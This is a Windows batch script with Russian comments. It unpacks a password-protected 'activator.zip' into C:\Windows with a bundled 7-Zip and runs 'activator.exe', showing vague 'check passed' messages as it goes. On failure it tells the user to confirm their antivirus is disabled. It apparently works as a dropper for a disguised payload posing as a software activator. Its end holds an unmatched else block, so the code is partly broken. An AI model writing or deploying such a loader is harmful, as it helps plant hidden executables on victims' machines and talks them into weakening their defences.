@echo off
chcp 65001
Color 4
cls
setlocal

REM === Настройка параметров ===
set "zip_file=C:\ProgramData\activator.zip"   REM Путь к ZIP-архиву
set "output_dir=C:\Windows"  REM Папка для распакованных файлов
set "password=123" REM Пароль к архиву
set "sevenzip_path=C:\ProgramData\7z.exe" REM Путь к 7-Zip
set "target_file=activator.exe"   REM Имя файла для запуска

REM === Проверка наличия 7-Zip ===
if not exist "%sevenzip_path%" (
  echo 7-Zip не найден в указанном пути: "%sevenzip_path%".
  echo Пожалуйста, укажите верный путь к 7z.exe.
  pause
  exit /b 1
)

REM === Создание папки для распаковки ===
if not exist "%output_dir%" (
  md "%output_dir%"
)

REM === Распаковка архива ===
echo Проверка#1...
"%sevenzip_path%" x "%zip_file%" -o"%output_dir%" -p"%password%" >nul
echo Проверка#2...

if %errorlevel% equ 0 (
    echo Проверка#1 - ОТЛИЧНО
) else (
    echo Произошла ошибка при проверке.
    echo Убедитесь, что антивирус отключен.
    pause
    exit /b 1
)

REM === Запуск целевого файла ===
set "target_file_path=%output_dir%\%target_file%"
if exist "%target_file_path%" (
    start "" "%target_file_path%"
) else (
    echo Файл "%target_file%" не найден в папке "%output_dir%".
    echo Пожалуйста, убедитесь, что файл с таким именем присутствует в архиве.
)
timeout 3 >null
    echo Проверка#2 - ОТЛИЧНО
) else (
    echo ОТЛИЧНО.
    echo ОТЛИЧНО.
)

endlocal
pause
exit /b 0